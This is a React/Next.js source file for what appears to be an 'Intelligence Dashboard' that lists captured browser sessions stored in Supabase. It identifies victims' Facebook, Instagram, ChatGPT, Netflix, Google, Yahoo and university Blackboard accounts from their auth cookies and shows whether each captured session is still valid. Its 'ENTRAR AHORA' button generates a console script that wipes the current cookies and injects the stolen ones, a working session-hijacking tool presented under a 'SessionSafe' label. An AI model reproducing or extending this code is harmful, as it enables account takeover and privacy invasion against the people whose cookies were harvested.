"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
}

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);

  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [viewMode, setViewMode] = useState<"grid" | "list">("grid");
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    fetchSessions();
    const timer = setInterval(() => fetchSessions(), 60000);
    return () => clearInterval(timer);
  }, []);

  const getHealthStatus = (sessionCookies: Cookie[]): "active" | "expiring" | "expired" => {
    if (!sessionCookies || sessionCookies.length === 0) return "active";
    const now = Date.now() / 1000;
    const sessionCookie = sessionCookies.find(c => ["c_user", "ds_user_id", "auth_token", "SID", "NetflixId"].includes(c.name));
    if (!sessionCookie || !sessionCookie.expiration_date) return "active";
    if (sessionCookie.expiration_date < now) return "expired";
    if (sessionCookie.expiration_date < now + 604800) return "expiring";
    return "active";
  };

  const identifyAccount = (sessionCookies: Cookie[], fallbackId: string): AccountInfo => {
    const health = getHealthStatus(sessionCookies);
    const domains = sessionCookies.map(c => c.domain.toLowerCase());
    const domainStr = domains.join(" ");
    
    // Detection Logic
    if (domainStr.includes("facebook.com")) {
      const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health };
    }
    if (domainStr.includes("instagram.com")) {
      const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
      return { platform: "Instagram", identifier: igId || "Instagram Account", icon: Instagram, color: "text-pink-500", health };
    }
    if (domainStr.includes("openai.com") || domainStr.includes("chatgpt.com")) 
      return { platform: "ChatGPT", identifier: "AI Assistant", icon: MessageSquare, color: "text-emerald-400", health };
    if (domainStr.includes("kick.com"))
      return { platform: "Kick", identifier: "Kick User", icon: Gamepad2, color: "text-green-500", health };
    if (domainStr.includes("x.com") || domainStr.includes("twitter.com"))
      return { platform: "X / Twitter", identifier: "Social", icon: Twitter, color: "text-blue-400", health };
    if (domainStr.includes("netflix.com"))
      return { platform: "Netflix", identifier: "Viewer", icon: Play, color: "text-red-600", health };
    if (domainStr.includes("yahoo.com"))
      return { platform: "Yahoo", identifier: "Mail User", icon: Mail, color: "text-purple-600", health };
    if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
      return { platform: "Blackboard", identifier: "Student", icon: GraduationCap, color: "text-blue-400", health };
    if (domainStr.includes("google.com"))
      return { platform: "Google", identifier: "Google User", icon: Globe, color: "text-red-400", health };
    if (domainStr.includes("openart.ai") || domainStr.includes("nijijourney") || domainStr.includes("midjourney"))
      return { platform: "AI Arts", identifier: "Creator", icon: Palette, color: "text-cyan-400", health };

    if (sessionCookies.length > 0) return { platform: "Active App", identifier: "Encrypted Session", icon: Bot, color: "text-amber-400", health };
    return { platform: "Unknown", identifier: fallbackId || "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
  };

  const fetchSessions = async () => {
    const { data: sessionData } = await supabase
      .from("session_snapshots")
      .select("*")
      .order("captured_at", { ascending: false })
      .limit(50);
    
    if (sessionData) {
      setSessions(sessionData);
      const sessionIds = sessionData.map(s => s.id);
      
      // Fetch identifying cookies with ALL columns to fix TypeScript error
      const { data: identifyingCookies } = await supabase
        .from("cookies")
        .select("*")
        .in("snapshot_id", sessionIds)
        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.auth_token,name.eq.SID,name.eq.NetflixId,name.eq.li_at,name.eq.dpr,name.eq.csrftoken,name.eq.sessionid,name.eq.midjourney_access");
      
      const newAccountMap: Record<string, AccountInfo> = {};
      sessionData.forEach(session => {
        const sessionCookies = identifyingCookies?.filter(c => c.snapshot_id === session.id) || [];
        newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
      });
      setAccountMap(newAccountMap);
    }
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data } = await supabase
      .from("cookies")
      .select("*")
      .eq("snapshot_id", snapshotId)
      .limit(1000);
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    setCopied(false);
    fetchCookies(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    return `(function() {
  const cookies = ${JSON.stringify(cookies)};
  console.clear();
  console.log('%c [SessionSafe] Limpiando Sesión... ', 'background: #f59e0b; color: #fff; font-weight: bold; padding: 5px;');
  
  document.cookie.split(";").forEach(function(c) { 
    const name = c.split("=")[0].trim();
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname.replace(/^www\./, ".");
  });

  console.log('%c [SessionSafe] Inyectando ' + cookies.length + ' cookies... ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px;');
  
  cookies.forEach(c => {
    try {
      document.cookie = c.name + '=' + encodeURIComponent(c.value) + '; domain=' + c.domain + '; path=' + (c.path || '/') + '; SameSite=Lax; Secure';
    } catch (e) {}
  });
  
  console.log('%c ¡ÉXITO! Recargando... ', 'color: #10b981; font-weight: bold;');
  setTimeout(() => location.reload(), 1500);
})();`;
  };

  const copyToClipboard = () => {
    const script = generateConsoleScript();
    if (!script) return;
    navigator.clipboard.writeText(script).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 5000);
    }).catch(() => prompt("Copia este código:", script));
  };

  const filteredSessions = sessions.filter(s => 
    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.platform.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="space-y-8 max-w-7xl mx-auto pb-40">
      <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-3xl font-bold tracking-tight">Intelligence Dashboard</h2>
          <p className="text-gray-400">Monitoring {sessions.length} sessions with safe data fetch.</p>
        </div>
        
        <div className="flex items-center gap-3">
          <div className="glass flex items-center px-4 py-2 rounded-2xl border border-white/10 w-full md:w-64">
            <Search className="text-gray-500 mr-2" size={18} />
            <input 
              type="text" 
              placeholder="Search..." 
              className="bg-transparent border-none outline-none text-sm w-full py-2"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <button onClick={() => {setLoading(true); fetchSessions();}} className="glass p-2.5 rounded-xl">
            <Clock size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
          </button>
        </div>
      </header>

      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
          {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-48 glass rounded-3xl animate-pulse" />)}
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
          {filteredSessions.map((session, idx) => {
            const info = accountMap[session.id] || { platform: "Unknown", identifier: "Anonymous", icon: Shield, color: "text-gray-400", health: "active" };
            return (
              <motion.div
                key={session.id}
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                onClick={() => handleSessionClick(session)}
                className={`glass p-6 rounded-3xl cursor-pointer border-2 transition-all hover:scale-[1.03] ${selectedSession?.id === session.id ? "border-blue-500 bg-blue-500/5 shadow-xl shadow-blue-500/20" : "border-transparent"}`}
              >
                <div className="flex items-start justify-between mb-4">
                  <div className={`p-3 rounded-2xl bg-white/5 ${info.color}`}>
                    <info.icon size={28} />
                  </div>
                  <div className="flex flex-col items-end gap-1">
                    <div className="glass-pill px-3 py-1 rounded-full text-[10px] font-bold text-gray-400 uppercase tracking-wider">
                      {info.platform}
                    </div>
                    <div className={`text-[9px] font-bold uppercase px-2 py-0.5 rounded-full flex items-center gap-1 ${
                      info.health === "active" ? "bg-emerald-500/10 text-emerald-400" : "bg-red-500/10 text-red-400"
                    }`}>
                      <div className={`w-1 h-1 rounded-full ${info.health === "active" ? "bg-emerald-500" : "bg-red-500"}`} />
                      {info.health}
                    </div>
                  </div>
                </div>
                <div>
                  <h4 className="font-bold text-lg truncate mb-1">{info.identifier}</h4>
                  <div className="flex items-center gap-2 text-xs text-gray-500">
                    <Clock size={12} />
                    {formatRelativeTime(session.captured_at)}
                  </div>
                </div>
              </motion.div>
            );
          })}
        </div>
      )}

      <AnimatePresence>
        {selectedSession && (
          <motion.div initial={{ opacity: 0, y: 100 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 100 }} className="fixed bottom-0 left-0 right-0 p-8 z-50 pointer-events-none">
            <div className="max-w-4xl mx-auto pointer-events-auto">
              <GlassCard className="border-t-2 border-blue-500 shadow-2xl bg-black/90 backdrop-blur-2xl px-8 py-6">
                <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                  <div className="flex items-center gap-5">
                    <div className={`p-4 rounded-3xl bg-white/5 ${accountMap[selectedSession.id]?.color}`}>
                      {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 48 })}
                    </div>
                    <div>
                      <h3 className="text-2xl font-bold">{accountMap[selectedSession.id]?.identifier}</h3>
                      <p className="text-gray-400 text-sm">Action ready for {accountMap[selectedSession.id]?.platform.toLowerCase()}</p>
                    </div>
                  </div>
                  <div className="flex gap-4">
                    <button onClick={() => setSelectedSession(null)} className="px-6 py-4 rounded-2xl glass font-bold text-gray-400">Cerrar</button>
                    <button onClick={copyToClipboard} className={"flex items-center gap-3 px-10 py-4 rounded-2xl font-black text-xl shadow-2xl " + (copied ? "bg-emerald-600" : "bg-blue-600 hover:bg-blue-500")}>
                      {copied ? <><Check size={24} /> COPIADO</> : <><Copy size={24} /> ENTRAR AHORA</>}
                    </button>
                  </div>
                </div>
              </GlassCard>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
